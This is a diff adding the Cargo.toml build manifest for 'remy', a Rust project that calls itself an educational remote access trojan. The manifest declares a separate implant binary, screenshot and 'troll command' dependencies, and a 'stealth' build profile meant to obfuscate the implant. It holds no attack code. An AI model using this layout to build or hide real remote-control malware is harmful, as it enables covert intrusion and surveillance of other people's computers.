@@ -1,0 +1,76 @@
+[package]
+name = "remy"
+version = "0.1.0"
+edition = "2024"
+authors = ["Aliasgar Khimani <mr.nerd.study@gmail.com>"]
+description = "A simple remote access trojan for educational purposes"
+license = "MIT"
+repository = "https://github.com/ARaChn3/remy"
+
+[dependencies]
+# Web framework
+axum = { version = "0.8", features = ["macros"] }
+tokio = { version = "1", features = ["full"] }
+tower = "0.5"
+tower-http = { version = "0.6", features = ["fs", "cors"] }
+
+# HTTP client (for implant)
+reqwest = { version = "0.12", features = ["json"] }
+
+# CLI
+clap = { version = "4", features = ["derive"] }
+
+# Serialization
+serde = { version = "1", features = ["derive"] }
+serde_json = "1"
+
+# Crypto
+aes-gcm = "0.10"
+rand = "0.8"
+base64 = "0.22"
+
+# Utilities
+uuid = { version = "1", features = ["v4"] }
+hostname = "0.4"
+chrono = { version = "0.4", features = ["serde"] }
+tracing = "0.1"
+tracing-subscriber = "0.3"
+
+# Troll commands
+open = "5"
+screenshots = "0.8"
+image = "0.24"  # Must match screenshots crate's version
+
+# Embed frontend
+rust-embed = "8"
+mime_guess = "2"
+
+# Platform-specific
+[target.'cfg(windows)'.dependencies]
+winapi = { version = "0.3", features = ["winuser", "shellapi"] }
+
+[target.'cfg(unix)'.dependencies]
+nix = { version = "0.29", features = ["process"] }
+
+[[bin]]
+name = "remy"
+path = "src/main.rs"
+
+[[bin]]
+name = "remy-implant"
+path = "src/implant/bin.rs"
+
+# Release profile - strip symbols, optimize for size, hide strings
+[profile.release]
+strip = true           # Strip symbols from binary
+lto = true             # Link-time optimization (smaller binary)
+codegen-units = 1      # Better optimization
+panic = "abort"        # Smaller binary, no unwinding
+opt-level = "z"        # Optimize for size
+
+# Stealth profile - maximum obfuscation for implant
+[profile.stealth]
+inherits = "release"
+strip = "symbols"      # Strip all symbols
+debug = false          # No debug info
+debug-assertions = false
